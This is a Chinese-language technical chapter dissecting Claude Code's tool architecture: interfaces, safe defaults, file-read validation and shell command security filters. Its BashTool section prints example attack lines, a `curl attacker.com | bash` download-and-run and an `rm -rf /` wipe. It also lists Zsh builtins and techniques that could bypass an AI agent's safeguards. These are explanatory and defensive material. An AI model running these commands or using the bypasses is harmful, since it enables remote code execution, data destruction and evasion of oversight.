# 第二章：工具系统——从接口设计到安全防线的完整剖析

## 为什么工具系统是 Claude Code 最重要的抽象

上一章提到模型本身无法与外部世界交互——它只能通过请求工具调用来读文件、跑命令、写代码。这意味着**工具系统的设计质量直接决定了整个智能体系统的能力上限和安全底线**。

一个设计糟糕的工具接口会导致什么？权限漏洞、输入验证遗漏、上下文窗口被撑爆、并发竞态条件……这些都是真实会遇到的问题。Claude Code 的 `Tool` 接口经过了大量迭代才达到今天的形状，每个方法的存在都有具体原因。

这一章会逐一剖析这些原因。

## Tool 接口的完整解剖

打开 `src/Tool.ts`，`Tool` 类型从第 362 行开始定义。它的泛型签名是：

```typescript
type Tool<
  Input extends AnyObject = AnyObject,
  Output = unknown,
  P extends ToolProgressData = ToolProgressData,
>
```

三个泛型参数分别对应：输入类型（通过 [Zod](https://zod.dev/) Schema 推断）、输出类型、进度事件类型。下面按功能分组讲解每个成员。

### 身份标识

```
name: string              // 唯一名称，如 "Read"、"Bash"、"Edit"
aliases?: string[]        // 向后兼容的别名
searchHint?: string       // 给 ToolSearch 用的关键词提示
```

`name` 是模型在 `tool_use` 块中引用工具时使用的标识符。`aliases` 解决了重命名问题——比如把 `FileRead` 改名为 `Read` 后，旧名称仍然能匹配到正确的工具（`toolMatchesName()` 函数，第 348 行）。

`searchHint` 的存在和 `shouldDefer` 有关。当工具数量很多时，不是所有工具都会在初始提示词中完整描述——有些工具被"延迟加载"（Deferred），模型需要先调用 `ToolSearch` 工具查找，才能使用它们。`searchHint` 就是帮助关键词匹配的，比如 `NotebookEdit` 的 searchHint 可能是 `'jupyter'`，这样模型搜索 "jupyter" 时就能找到它。

### 输入与输出 Schema

```
readonly inputSchema: Input           // Zod Schema
readonly inputJSONSchema?: ToolInputJSONSchema  // JSON Schema（MCP 工具用）
outputSchema?: z.ZodType<unknown>     // 输出 Schema（可选）
```

💡 **[Zod](https://zod.dev/)** 是一个 TypeScript 优先的 Schema 校验库。它和 JSON Schema 的根本区别在于：Zod Schema 同时是类型定义和运行时校验器。你写一次 `z.object({ path: z.string() })`，就同时得到了 TypeScript 类型推断和运行时输入验证。

为什么选 Zod 而不是直接用 JSON Schema？几个原因：

1. **类型安全**：`z.infer<Input>` 自动推断出 TypeScript 类型，`call()` 方法的参数就是强类型的
2. **`.describe()` 注解**：Zod 的 `describe()` 方法直接成为工具描述中的参数说明，模型在系统提示词中看到的就是这些描述
3. **验证逻辑可组合**：`z.number().int().nonnegative()` 比手写 JSON Schema 的 `{ type: "integer", minimum: 0 }` 更可读
4. **默认值和转换**：Zod 可以在校验的同时做类型转换和默认值填充

`inputJSONSchema` 是给 MCP（[Model Context Protocol](https://modelcontextprotocol.io/)）工具准备的——MCP 协议使用 JSON Schema 格式，有些外部工具直接提供 JSON Schema 而不是 Zod Schema。

### call() 方法——执行的核心

```typescript
call(
  args: z.infer<Input>,
  context: ToolUseContext,
  canUseTool: CanUseToolFn,
  parentMessage: AssistantMessage,
  onProgress?: ToolCallProgress<P>,
): Promise<ToolResult<Output>>
```

你可能会好奇：为什么 `call()` 需要这么多参数？每个都有不可省略的理由：

- **args**: 经过 Zod 验证的输入，类型安全
- **context**: 工具执行需要的所有环境信息（详见后面的 ToolUseContext 部分）
- **canUseTool**: 权限检查回调。为什么不直接从 context 里拿？因为它可能被上游装饰过（QueryEngine 就是这样做的——包装它来追踪权限拒绝）
- **parentMessage**: 触发这次工具调用的助手消息。有些工具需要知道上下文——比如 `FileReadTool` 用它来获取 `message.id` 做遥测
- **onProgress**: 进度回调，用于在执行过程中报告中间状态（如 Bash 命令的标准输出流）

返回类型 `ToolResult<Output>` 也值得展开（第 321 行）：

```typescript
type ToolResult<T> = {
  data: T                           // 工具产出的实际数据
  newMessages?: (UserMessage | ...)[] // 附加消息（如图片元数据）
  contextModifier?: (context: ToolUseContext) => ToolUseContext  // 上下文修改器
  mcpMeta?: { ... }                 // MCP 协议元数据
}
```

`contextModifier` 是一个精妙的设计：工具执行后可能需要修改后续工具的执行上下文。但这个修改不是立即生效的——它被收集起来，在当前批次的所有工具执行完毕后统一应用。这避免了并发执行时的竞态条件。

`newMessages` 让工具可以在结果之外注入额外消息。`FileReadTool` 读取图片时就用这个机制——图片本身作为 `tool_result` 返回，图片的元数据（尺寸信息）作为额外的用户消息注入，这样模型能同时看到图片和它的元数据。

### 验证与权限——为什么要分开

```typescript
validateInput?(input, context): Promise<ValidationResult>
checkPermissions(input, context): Promise<PermissionResult>
```

这两个方法解决不同层次的问题：

**`validateInput()`** 回答的是："这个输入在技术上是否合理？"
- 路径是否是绝对路径？
- 文件是否是二进制格式？
- 设备文件是否会导致挂起？

验证失败时，错误信息直接发回给模型（不展示给用户），模型可以据此自我修正——比如收到"路径必须是绝对路径"后，模型会重新调用工具并使用绝对路径。

**`checkPermissions()`** 回答的是："用户是否授权了这个操作？"
- 文件路径是否在允许列表中？
- Shell 命令是否匹配拒绝规则？
- 是否需要弹出用户确认提示？

权限拒绝时，系统可能弹出交互式提示让用户决定。这两者必须分开的原因很直接：你不希望一个"路径格式错误"的输入触发用户确认弹窗——那只会困惑用户。反过来，一个格式正确但未授权的路径应该让用户决定而不是默默拒绝。

`validateInput()` 是可选的（加了 `?`），而 `checkPermissions()` 是必须的——如果你不提供自定义权限检查，`buildTool()` 会填入一个默认的"全部允许"实现。

### 渲染方法——UI 与核心逻辑的桥梁

```typescript
renderToolUseMessage(input, options): React.ReactNode     // 渲染"正在调用工具..."
renderToolResultMessage?(result, progress, options): React.ReactNode  // 渲染结果
renderToolUseProgressMessage?(progress, options): React.ReactNode    // 渲染进度
renderToolUseRejectedMessage?(input, options): React.ReactNode       // 渲染被拒绝
renderToolUseErrorMessage?(result, options): React.ReactNode         // 渲染错误
renderGroupedToolUse?(toolUses, options): React.ReactNode | null     // 渲染分组
renderToolUseTag?(input): React.ReactNode                            // 渲染标签
```

渲染方法的设计体现了一个原则：**每个工具最了解如何展示自己的状态**。

`renderToolUseMessage()` 是唯一必须实现的渲染方法——因为系统需要在工具执行前就展示"正在做什么"给用户看。注意它接收 `Partial<z.infer<Input>>`——参数可能还没流式完，所以必须处理部分输入的情况。

`renderToolResultMessage()` 是可选的——有些工具的结果不需要在终端上渲染。比如 `TodoWriteTool` 更新的是侧边的 TODO 面板，不需要在消息流中显示任何东西。

`renderGroupedToolUse()` 解决了一个 UI 问题：当模型并发调用多个同类工具时（比如同时读取三个文件），把它们合并成一个分组显示比逐个显示更紧凑。这个方法返回 `null` 时，系统回退到逐个渲染。

### maxResultSizeChars——防止上下文窗口爆炸

```typescript
maxResultSizeChars: number
```

这个属性控制工具结果的最大字符数。当结果超过这个限制时，系统会：

1. 把完整结果持久化（Persist）到磁盘文件
2. 向模型发送截断的预览（Preview）加上磁盘文件的路径
3. 模型如果需要完整内容，可以通过 `Read` 工具读取磁盘文件

默认值通常是 40,000 字符左右。但 `FileReadTool` 把它设为 `Infinity`——为什么？

看 `FileReadTool.ts:342` 的注释：

```
// Output is bounded by maxTokens (validateContentTokens). Persisting to a
// file the model reads back with Read is circular — never persist.
```

如果 `FileReadTool` 的结果也被持久化到文件，模型读取那个文件又会触发一次 `FileReadTool` 调用，那个调用的结果又被持久化……这就成了循环。所以 `FileReadTool` 自己通过 `validateContentTokens()` 在 `call()` 内部控制输出大小，不需要外部的持久化机制。

这个决定体现了一个工程判断：**每层控制的粒度应该匹配它的职责**。通用的 `maxResultSizeChars` 对大部分工具够用了，但特殊工具需要自己的策略。

### shouldDefer 和 ToolSearch 的联动

```typescript
readonly shouldDefer?: boolean
readonly alwaysLoad?: boolean
```

当工具数量超过一定阈值时，把所有工具的完整描述塞进系统提示词会显著增加 token 消耗。`shouldDefer` 标记的工具不会在初始提示词中包含完整描述——模型只知道有一个 `ToolSearch` 工具可以搜索更多能力。

这是一种 **按需加载**（Lazy Loading）策略。模型在需要特殊功能时（比如编辑 Jupyter Notebook），先调用 `ToolSearch` 搜索 "jupyter"，系统返回 `NotebookEdit` 工具的完整描述，模型才能调用它。

`alwaysLoad` 是反向标记——即使 `ToolSearch` 启用了，标记了 `alwaysLoad` 的工具也不会被延迟。这用于那些模型在第一轮就可能需要的核心工具。

### 其他实用方法

```typescript
isConcurrencySafe(input): boolean      // 并发安全？
isReadOnly(input): boolean             // 只读？
isDestructive?(input): boolean         // 不可逆？(删除/覆写/发送)
interruptBehavior?(): 'cancel' | 'block'  // 用户中断时怎么办？
isSearchOrReadCommand?(input): { isSearch, isRead, isList? }  // 搜索/读取分类
isEnabled(): boolean                   // 当前上下文下是否启用
```

`isConcurrencySafe()` 和 `isReadOnly()` 都接受 `input` 参数——因为同一个工具在不同输入下可能有不同的并发安全特性。比如理论上 `BashTool` 执行 `ls` 是只读的，但执行 `rm` 不是。不过实际实现中，`BashTool` 保守地始终返回 `false`。

`isDestructive()` 是专门为不可逆操作设计的——删除文件、覆写内容、发送网络请求。它和 `isReadOnly` 的区别在于：非只读操作可能只是修改了一个可以撤销的文件，但破坏性操作可能真的无法恢复。权限系统对破坏性操作可以采取更严格的策略。

`interruptBehavior()` 处理一个边缘场景：用户在工具执行过程中提交了新消息。`'cancel'` 表示立即停止（丢弃结果），`'block'` 表示让新消息等待当前工具完成。默认是 `'block'`。

## buildTool() 工厂函数——安全默认值的哲学

`buildTool()` 定义在 `src/Tool.ts:783`，核心实现极其简洁：

```typescript
export function buildTool<D extends AnyToolDef>(def: D): BuiltTool<D> {
  return {
    ...TOOL_DEFAULTS,
    userFacingName: () => def.name,
    ...def,
  } as BuiltTool<D>
}
```

就是一个对象展开。但 `TOOL_DEFAULTS`（第 757 行）的默认值选择非常讲究：

```typescript
const TOOL_DEFAULTS = {
  isEnabled: () => true,                    // 默认启用
  isConcurrencySafe: (_input?) => false,    // 默认不安全——假设有副作用
  isReadOnly: (_input?) => false,           // 默认有写入——假设最坏情况
  isDestructive: (_input?) => false,        // 默认非破坏性
  checkPermissions: (input, _ctx?) =>       // 默认允许——委托给通用权限系统
    Promise.resolve({ behavior: 'allow', updatedInput: input }),
  toAutoClassifierInput: (_input?) => '',   // 默认跳过安全分类器
  userFacingName: (_input?) => '',          // 默认空名称
}
```

注释里写得很清楚（第 754 行）：**"Defaults (fail-closed where it matters)"**——在安全相关的属性上，默认值选择更保守的选项。

具体来说：
- `isConcurrencySafe` 默认 `false`：忘了标记并发安全的工具会被串行执行。结果是性能差一点，但不会出竞态 bug。反过来如果默认 `true`，忘了标记的写入工具会被并发执行，可能导致数据损坏
- `isReadOnly` 默认 `false`：忘了标记只读的工具会被当作写入工具处理，需要更严格的权限检查。不会导致安全漏洞，只是多弹一次确认
- `checkPermissions` 默认"允许"：这看起来像是 fail-open，但实际上所有安全相关的工具都必须自己实现权限检查。默认值存在的原因是：不是所有工具都需要权限（比如 `TodoWriteTool` 只是在内存中更新一个列表）

这种"关闭失败"（Fail-Closed）的设计思路如果让我来评价：**这是正确的权衡**。在安全系统中，假阳性（多弹一次确认）的代价远低于假阴性（漏掉一次危险操作）。

## 案例分析一：FileReadTool 的完整实现

`src/tools/FileReadTool/FileReadTool.ts` 是理解工具系统的最佳入口。它有 1100+ 行代码，处理文本文件、图片、PDF、Jupyter Notebook 四种类型。

### 输入 Schema 设计

```typescript
// FileReadTool.ts:227-243
const inputSchema = lazySchema(() =>
  z.strictObject({
    file_path: z.string().describe('The absolute path to the file to read'),
    offset: semanticNumber(z.number().int().nonnegative().optional()).describe(
      'The line number to start reading from...',
    ),
    limit: semanticNumber(z.number().int().positive().optional()).describe(
      'The number of lines to read...',
    ),
    pages: z.string().optional().describe(
      `Page range for PDF files (e.g., "1-5", "3", "10-20")...`,
    ),
  }),
)
```

几个设计细节：

**`lazySchema()`**：Schema 被包在一个 thunk（💡 延迟求值的函数包装器）里，只在首次访问时才创建 Zod 实例。为什么？因为 Zod Schema 的创建有一定开销，而且系统启动时并不是每个工具都会被用到。

**`z.strictObject()`**：注意用的是 `strictObject` 而不是 `object`。区别在于 `strictObject` 不允许多余的属性——如果模型生成了 Schema 里没定义的字段，Zod 会报错。这比 `object().strip()` 更安全，因为多余的字段可能意味着模型误用了工具。

**`semanticNumber()`**：这是一个自定义的 Zod 包装器，它允许数字被传入为字符串（如 `"42"`）并自动转换。为什么需要？因为模型有时会把数字输出为带引号的字符串。与其返回一个对模型没帮助的类型错误，不如做宽容的转换。

**`.describe()` 注解**：每个参数的 `.describe()` 内容会被注入到系统提示词中，成为模型理解参数用途的唯一信息。好的描述能显著减少模型的错误调用率。

### validateInput() 的安全哲学

`FileReadTool` 的 `validateInput()` 方法（第 418-495 行）是安全设计的教科书范例。看看它检查了什么：

**1. PDF 页码格式**（第 420-440 行）：

纯字符串解析，不做任何 I/O。验证 `pages` 参数格式是否合法、范围是否在允许限制内（`PDF_MAX_PAGES_PER_READ`）。

**2. 拒绝规则匹配**（第 442-459 行）：

```typescript
const denyRule = matchingRuleForInput(
  fullFilePath,
  appState.toolPermissionContext,
  'read',
  'deny',
)
if (denyRule !== null) {
  return {
    result: false,
    message: 'File is in a directory that is denied by your permission settings.',
    errorCode: 1,
  }
}
```

如果用户配置了"拒绝读取 `~/.ssh/` 下的文件"，这里就会拦截。注意这也不做 I/O——只是字符串匹配。

**3. UNC 路径检测**（第 461-467 行）：

```typescript
const isUncPath = fullFilePath.startsWith('\\\\') || fullFilePath.startsWith('//')
if (isUncPath) {
  return { result: true }  // 提前返回，让 checkPermissions 处理
}
```

这里有一个不太直觉的设计：UNC 路径（Universal Naming Convention，Windows 网络共享路径）通过验证后跳过后续检查，交给 `checkPermissions()` 处理。为什么不直接拒绝？

注释解释了原因：`stat()` 这样的 I/O 操作会发起 SMB 连接，可能在权限检查前就泄露 NTLM 凭据。所以 `validateInput()` 对 UNC 路径什么都不做（不检查文件是否存在、是否是二进制），把所有决策权留给权限系统。这是一个典型的**安全优先于便利**的设计。

**4. 二进制文件检测**（第 469-482 行）：

基于文件扩展名判断（不读取文件内容），但排除了 PDF、图片和 SVG——这些"二进制"格式有专门的渲染路径。

**5. 危险设备文件**（第 484-492 行）：

```typescript
const BLOCKED_DEVICE_PATHS = new Set([
  '/dev/zero', '/dev/random', '/dev/urandom', '/dev/full',  // 无限输出
  '/dev/stdin', '/dev/tty', '/dev/console',                 // 阻塞等待输入
  '/dev/stdout', '/dev/stderr',                             // 无意义
  '/dev/fd/0', '/dev/fd/1', '/dev/fd/2',                   // fd 别名
])
```

如果模型试图读取 `/dev/zero`（会产生无限的零字节流），这里直接拦截。这是防止进程挂起的最后一道防线。

整个 `validateInput()` 的核心原则：**所有检查都是基于输入字符串的，不做任何文件系统 I/O**。I/O 只在 `checkPermissions()` 通过之后、`call()` 内部才发生。

### call() 的分支路由

`FileReadTool` 的 `call()` 方法（第 496 行开始）通过文件扩展名路由到不同的处理路径：

1. **Notebook 路径**（`.ipynb`）：用 `readNotebook()` 解析 Jupyter Notebook 的 JSON 格式
2. **图片路径**（`.png/.jpg/.gif/.webp`）：用 `readImageWithTokenBudget()` 读取并压缩
3. **PDF 路径**（`.pdf`）：根据是否指定 `pages` 参数、模型是否支持原生 PDF、文件大小，选择不同策略
4. **文本路径**（其他扩展名）：用 `readFileInRange()` 按行范围读取

每条路径都有自己的大小限制和 token 预算检查。

文本路径有一个值得注意的优化——**文件去重**（Dedup，第 536-573 行）：

如果模型在同一个对话中重复读取同一个文件的同一个范围，而文件在两次读取之间没有被修改过（通过比较 mtime），`call()` 返回一个 `file_unchanged` stub 而不是完整内容。

```typescript
// FileReadTool.ts:561-566
return {
  data: {
    type: 'file_unchanged' as const,
    file: { filePath: file_path },
  },
}
```

根据注释中引用的数据，大约 18% 的 Read 调用是对同一文件的重复读取。去重后，这些调用不再消耗 cache_creation token（缓存创建开销），显著降低了长对话的 API 费用。

### mapToolResultToToolResultBlockParam()——结果的 API 格式化

这个方法（第 652 行）把工具的内部输出格式转换为 Claude API 期望的 `ToolResultBlockParam` 格式。文本文件有一个有趣的安全特性：

```typescript
content = memoryFileFreshnessPrefix(data) +
  formatFileLines(data.file) +
  (shouldIncludeFileReadMitigation()
    ? CYBER_RISK_MITIGATION_REMINDER
    : '')
```

`CYBER_RISK_MITIGATION_REMINDER`（第 729 行）是一段注入到文件内容后面的系统提醒，告诉模型："如果这个文件看起来像恶意软件，你可以分析它但不能改进它。"这是一种恶意软件辅助编写的防御措施。

有趣的是，`shouldIncludeFileReadMitigation()` 函数（第 735 行）检查当前模型是否在豁免列表中。某些模型（如 `claude-opus-4-6`）被豁免了——大概是因为这些模型的内置安全性已经足够强。

## 案例分析二：BashTool 的安全系统

`BashTool` 是整个 Claude Code 中安全挑战最大的工具——它执行任意 Shell 命令。安全过滤的核心在 `src/tools/BashTool/bashSecurity.ts`。

### 命令替换模式检测

文件开头（第 16-41 行）定义了一系列危险的命令替换模式：

```typescript
const COMMAND_SUBSTITUTION_PATTERNS = [
  { pattern: /<\(/, message: 'process substitution <()' },
  { pattern: />\(/, message: 'process substitution >()' },
  { pattern: /=\(/, message: 'Zsh process substitution =()' },
  { pattern: /\$\(/, message: '$() command substitution' },
  { pattern: /\$\{/, message: '${} parameter substitution' },
  { pattern: /\$\[/, message: '$[] legacy arithmetic expansion' },
  // ... 更多模式
]
```

为什么要阻止命令替换？因为攻击者可以在看似无害的命令中嵌入危险操作。比如：

```bash
echo "$(curl attacker.com | bash)"    # $() 嵌入了网络下载和执行
cat "$(rm -rf /)"                     # 删除整个文件系统
```

安全过滤器在引号剥离后的命令文本上检查这些模式。如果检测到，命令被标记为"需要权限检查"而不是直接执行。

### Zsh 特有的危险命令

第 45-74 行定义了 Zsh 特有的危险命令集：

```typescript
const ZSH_DANGEROUS_COMMANDS = new Set([
  'zmodload',    // 加载内核模块——通向文件I/O、网络、伪终端等
  'emulate',     // emulate -c 是 eval 等价物
  'sysopen',     // 精细控制的文件打开
  'sysread',     // 文件描述符读取
  'syswrite',    // 文件描述符写入
  'zpty',        // 伪终端命令执行
  'ztcp',        // TCP 连接（可用于数据渗出）
  'zsocket',     // Unix/TCP socket
  'zf_rm',       // 绕过 binary 检查的内置 rm
  // ...
])
```

为什么要专门处理 Zsh？因为 macOS 的默认 Shell 是 Zsh，大量 Claude Code 用户在 Zsh 环境下工作。Zsh 有一些 Bash 没有的特性，可以被用来绕过安全检查。

比如 `zmodload zsh/system` 加载系统模块后，`syswrite` 命令可以直接写文件描述符——这绕过了 `FileWriteTool` 的权限系统。`ztcp` 可以建立 TCP 连接——这绕过了网络访问限制。

注释（第 46-51 行）解释了防御策略："这些命令需要先执行 `zmodload`，但我们把它们也阻止了作为纵深防御（Defense in Depth），以防 `zmodload` 被绕过或模块被预加载。"

### 引号剥离——安全分析的基础

`extractQuotedContent()` 函数（第 128-174 行）是整个安全系统的基础。它遍历命令字符串，跟踪引号状态，生成三个版本的命令文本：

1. **withDoubleQuotes**: 剥离单引号内容，保留双引号内容
2. **fullyUnquoted**: 剥离所有引号内容
3. **unquotedKeepQuoteChars**: 剥离引号内容但保留引号字符本身

为什么需要三个版本？不同的安全检查需要看到命令的不同"视图"。比如检测命令替换（`$()`）时，需要忽略引号内的内容（因为引号内的 `$()` 不会被执行）。但检测 mid-word hash（`'x'#`，可能把后面的命令变成注释）时，需要看到引号字符在什么位置。

### 安全检查编号系统

`BASH_SECURITY_CHECK_IDS`（第 77-101 行）定义了 23 种检查类型的数字编号——不完整命令、混淆标志、shell 元字符、危险变量、换行注入、花括号展开、控制字符、Unicode 空白等。用数字而不是字符串标识是为了遥测日志的存储和查询效率。

## ToolUseContext——工具的执行环境

`ToolUseContext` 定义在 `src/Tool.ts:158-300`，是传递给 `call()` 方法的上下文对象。它有 50+ 个字段，但可以分为几个功能组：

### 核心选项（options）

包含 `commands`（斜杠命令）、`tools`（所有工具实例）、`mainLoopModel`（当前模型）、`thinkingConfig`（思考模式）、`mcpClients`（MCP 连接）、`isNonInteractiveSession`（是否 headless）、`agentDefinitions`（子智能体定义）、`maxBudgetUsd`（预算上限）等。

其中 `refreshTools` 回调的存在原因很微妙：MCP 服务器可能在查询进行中才完成连接，新的 MCP 工具需要动态加入。`refreshTools` 让工具可以获取最新列表而不需要等到下一轮循环。

### 状态管理

`abortController`（取消信号）、`readFileState`（文件状态 LRU 缓存）、`getAppState/setAppState`（应用状态读写）、`messages`（对话历史）。

`setAppState` 和 `setAppStateForTasks` 的区别很关键：子智能体的 `setAppState` 是空操作（no-op），但后台任务需要在主线程上注册资源——`setAppStateForTasks` 始终指向根状态存储，不管嵌套了多少层子智能体。

### UI 回调

`setToolJSX`、`addNotification`、`appendSystemMessage`、`sendOSNotification`、`setStreamMode` 等——在 SDK/headless 模式下大部分是 `undefined`。工具实现必须用 `?.` 可选链调用，不能假设 UI 回调存在。

### 文件和权限

`fileReadingLimits`（读取限制）、`toolDecisions`（权限决策缓存）、`localDenialTracking`（拒绝计数）、`contentReplacementState`（结果预算）。

`localDenialTracking` 解决了一个子智能体的问题：`setAppState` 是空操作，权限拒绝计数无法通过正常状态更新累积。没有这个字段，子智能体永远无法触发"多次拒绝后回退到弹窗确认"的阈值逻辑。源码注释明确说了"Mutable — the permissions code updates it in place"——用可变字段解决不可变约束，是务实的选择。

## 工具结果管理——auto-persistence 机制

工具的 `call()` 返回 `ToolResult<Output>`，但这个结果在到达模型之前还要经过一个处理管道。

### 大结果持久化

当结果的文本长度超过 `maxResultSizeChars` 时，系统自动执行以下步骤（这个逻辑在 `src/utils/toolResultStorage.ts` 中）：

1. 把完整结果写入临时文件（在 scratchpad 目录下）
2. 生成一个截断的预览（通常是开头和结尾各取一部分）
3. 在预览中附上临时文件的路径，告诉模型"完整结果在这里"

模型如果需要看完整内容，会调用 `Read` 工具读取那个临时文件。这个设计把上下文窗口（Context Window）当作稀缺资源来管理——如果一个 `grep` 搜索返回了 200,000 个字符的结果，把它全部塞进上下文窗口是极大的浪费。

### 结果预算（Content Replacement State）

除了单个工具结果的大小限制，系统还有一个跨所有工具调用的"结果预算"。`applyToolResultBudget()`（在 `query.ts` 中被调用）跟踪当前轮次中所有工具结果的累计大小，当接近上下文窗口限制时，开始主动截断早期的结果。

这是一个全局性的资源管理策略。想象一下：模型先读了 10 个文件（每个 4000 字符），然后开始做编辑。那 10 个文件的内容加起来 40,000 字符，占据了大量上下文空间。如果模型不需要再参考早期的文件内容，系统可以把它们替换为简短的摘要，为后续的工具调用腾出空间。

## 如何设计你自己的工具

基于以上的分析，这里给出一个具体的步骤清单和决策指南。

### 第一步：确定工具的边界

问自己：
- 这个工具做的是**一件事**还是**几件事**？如果是几件事，拆成多个工具
- 这个工具的输入和输出是什么？能不能用几句话描述清楚？
- 模型需要什么信息才能正确使用这个工具？

### 第二步：设计输入 Schema

```typescript
const inputSchema = z.strictObject({
  // 每个参数都要有 .describe()，这是模型理解参数的唯一信息
  filePath: z.string().describe('绝对路径，如 /home/user/project/src/main.ts'),
  // 可选参数用 .optional()，给出默认值的语义
  lineStart: z.number().int().nonnegative().optional()
    .describe('起始行号（1-indexed）。省略则从文件开头读取'),
})
```

关键决策：
- 用 `strictObject` 还是 `object`？优先 `strictObject`，除非你需要接受模型传入的额外字段
- 参数名用 `camelCase` 还是 `snake_case`？Claude Code 的工具统一用 `snake_case`，因为 Python 社区的模型训练数据更多用 `snake_case`
- `.describe()` 写什么？写模型需要知道的约束和格式要求，不写显而易见的内容

### 第三步：实现验证

```typescript
async validateInput({ filePath }, context) {
  // 规则：所有检查都应该是纯字符串/逻辑操作，不做 I/O
  if (!path.isAbsolute(filePath)) {
    return { result: false, message: '路径必须是绝对路径', errorCode: 1 }
  }
  return { result: true }
}
```

关键决策：
- 什么检查放在 `validateInput()`，什么放在 `checkPermissions()`？
  - `validateInput()`：输入本身是否合法（格式、范围、类型）
  - `checkPermissions()`：操作是否被授权
- 错误消息写给谁看？写给模型看——它需要从中理解如何修正输入

### 第四步：实现权限检查

```typescript
async checkPermissions(input, context) {
  const appState = context.getAppState()
  // 委托给已有的权限基础设施
  return checkReadPermissionForTool(MyTool, input, appState.toolPermissionContext)
}
```

如果你的工具是只读的，直接用 `checkReadPermissionForTool()`。如果是写入工具，参考 `FileEditTool` 或 `FileWriteTool` 的实现。

### 第五步：实现 call()

```typescript
async call({ filePath, lineStart = 1 }, context) {
  const { abortController, readFileState } = context

  // 1. 在长操作中检查取消信号
  if (abortController.signal.aborted) {
    throw new Error('Operation cancelled')
  }

  // 2. 执行实际操作
  const content = await readFile(filePath)

  // 3. 更新状态（如文件缓存）
  readFileState.set(filePath, { content, timestamp: Date.now() })

  // 4. 返回结构化结果
  return { data: { type: 'text', content } }
}
```

### 第六步：设置元数据标志

```typescript
export const MyTool = buildTool({
  name: 'MyTool',
  maxResultSizeChars: 40_000,  // 或 Infinity 如果结果不应该被持久化

  // 并发安全性——如果工具没有副作用，设为 true
  isConcurrencySafe() { return true },

  // 只读性——如果工具不修改任何状态，设为 true
  isReadOnly() { return true },

  // 启用条件——某些环境下不可用？
  isEnabled() { return !isInRestrictedMode() },

  // ...
})
```

### 决策清单

在提交工具实现前，逐一回答这些问题：

- [ ] `isConcurrencySafe` 和 `isReadOnly` 是否正确设置？（默认值是保守的，但如果你的工具是只读的，显式标记能获得并发执行的性能优势）
- [ ] `validateInput()` 是否避免了 I/O 操作？
- [ ] `call()` 是否检查了 `abortController.signal`？
- [ ] 结果大小是否可能超过 `maxResultSizeChars`？如果是，设置合理的限制
- [ ] 错误消息是否足够清晰，让模型能自我修正？
- [ ] `.describe()` 注解是否准确描述了参数的约束和格式？
- [ ] 如果工具操作文件路径，是否实现了 `getPath()` 方法？
- [ ] 如果工具需要在延迟加载模式下被发现，`searchHint` 是否设置了有意义的关键词？

## 工具系统的宏观视角

回顾这整个系统，Claude Code 的工具架构做了几个根本性的正确选择：

**1. 接口而非继承**。工具不需要继承基类，只需要满足接口。这让工具的实现方式完全自由——你可以用函数式风格、可以用类、可以是一个对象字面量。`buildTool()` 工厂提供了便利但不强制。

**2. 验证管道是声明式的**。每一层验证（Schema、validateInput、checkPermissions）都是独立的、可以单独测试的。你不需要启动整个系统就能测试一个工具的权限逻辑。

**3. 上下文是注入的**。工具不 import 全局单例——它们通过 `ToolUseContext` 接收所需的一切。这使得工具在隔离环境中（如子智能体）可以拿到不同的上下文而不需要修改代码。

**4. 安全是组合的**。命令过滤（bashSecurity）、权限检查（checkPermissions）、钩子系统（PreToolUse/PostToolUse）、结果限制（maxResultSizeChars）——每层独立工作，组合起来形成纵深防御。

如果你在构建自己的智能体系统，这四个设计原则都值得直接借鉴。它们不是 Claude Code 特有的最佳实践——它们是分布式系统和安全工程领域几十年经验的结晶。
